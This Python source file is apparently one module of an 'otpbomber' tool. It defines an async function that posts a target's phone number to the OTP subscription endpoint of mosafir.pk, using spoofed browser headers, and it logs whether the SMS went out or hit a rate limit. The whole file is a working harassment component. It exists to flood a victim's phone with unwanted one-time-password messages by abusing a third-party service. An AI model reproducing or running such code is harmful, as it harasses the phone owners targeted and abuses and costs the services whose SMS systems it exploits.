from otpbomber.core import *
from otpbomber.localuseragent import *

async def mosafir(phone, client, out):
    name = "mosafir"
    domain = "mosafir"
    frequent_rate_limit=False

    headers = {
            "user-agent": random.choice(ua["browsers"]["chrome"]),
    }
    headers = {
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
         'Origin': 'http://www.sub.mosafir.pk',
        'Referer': 'http://www.sub.mosafir.pk/',
        'User-Agent': random.choice(ua["browsers"]["chrome"]),
        'X-Requested-With': 'XMLHttpRequest',
    }

    data = {
        'contact_number': f"{phone[1:]}",
        'function_to_call': '0',
        'otp': '',
        'digit-1': '',
        'digit-2': '',
        'digit-3': '',
        'digit-4': '',
    }

    response = await client.post(
        'http://www.sub.mosafir.pk/subscription/jazzOTP_subscription.php',
        headers=headers,
        data=data
    )
    try:
        data=response.json()
        if data["msg"] == "Success":
            out.append({"name": name,"domain":domain,"frequent_rate_limit":frequent_rate_limit, "rateLimit": False,"sent": True, "error": False})
            return None
        if data["msg"] == "Pin Not Allowed":
            out.append({"name": name,"domain":domain,"frequent_rate_limit":frequent_rate_limit, "rateLimit": True,"sent": False, "error": False})
            return None
    except Exception:
        out.append({"name": name,"domain":domain,"frequent_rate_limit":frequent_rate_limit,  "rateLimit": False, "sent": False, "error": True})
        return None